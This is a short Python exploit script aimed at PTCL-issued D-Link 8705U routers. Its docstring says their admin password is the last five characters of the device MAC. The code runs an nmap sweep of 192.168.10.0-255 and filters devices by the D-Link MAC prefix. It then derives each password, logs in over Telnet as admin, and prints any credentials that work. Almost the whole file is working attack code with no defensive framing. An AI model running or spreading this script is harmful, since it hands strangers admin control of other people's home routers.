'''
All PTCL routers (Dlink 8705U) have default user 'admin' and default password the last 5 characters of its
MAC. This exploits this default password vulnerability.
'''
import nmap, telnetlib

def connect(ip, user, passwd,debug=False):
    ''' Check if credentials work on the default PTCL router.'''
    user += '\r'
    passwd += '\n'
    client = telnetlib.Telnet(ip)
    client.read_until( bytearray('Login:'.encode('utf8')) )
    client.write(bytearray(user.encode('utf8')))
    client.read_until( bytearray('Password:'.encode('utf8')) )
    client.write(bytearray(passwd.encode('utf8')))
    client.write(bytearray('arp show\n'.encode('utf8')))
    STDOUT = str(client.read_until(bytearray(':'.encode('utf8'))))
    if debug: print('Stdout from Telnet iface:', STDOUT)
    if 'arp show' in STDOUT:
        print ('[+] Exploit Success.')    
        return True
    return False

def DlinkExploit(debug=False):
    '''
    1) Scan for live IP addresses in the range 192.168.10.0-255.
    2) Search for Dlink IP and exploit.
    '''
    nm = nmap.PortScanner()
    print('[+] Starting Nmap scan in IP Range: 192.168.10.0-255 (Default for PTCL Dlink Router IP)')
    result = nm.scan(hosts='192.168.10.0-255', arguments='-sn')
    routers = {}
    for ip in result['scan'].keys():
        MAC = list(result['scan'][ip]['vendor'].keys())
        
        if len(MAC)!=0:
            MAC = MAC[0].upper()
            vendor = result['scan'][ip]['vendor'][MAC]
            if debug: print ('Nmap result:', ip, MAC, vendor)
     
        if MAC[:8] == '40:9B:CD':
            if debug: print('Program result: Dlink Router')
            routers[ip] = MAC
    
    if debug: print( routers )
    for ip in routers:
        passwd = ''.join([i for i in routers[ip].split(':')])[-5:].lower()
        print('Trying user=admin, password={} on {}'.format(passwd, ip))
        if connect(ip, 'admin', passwd, debug=debug):
            print('[+] Admin password for {} is \"{}\"'.format(ip, passwd))

if __name__ == '__main__':
    DlinkExploit()

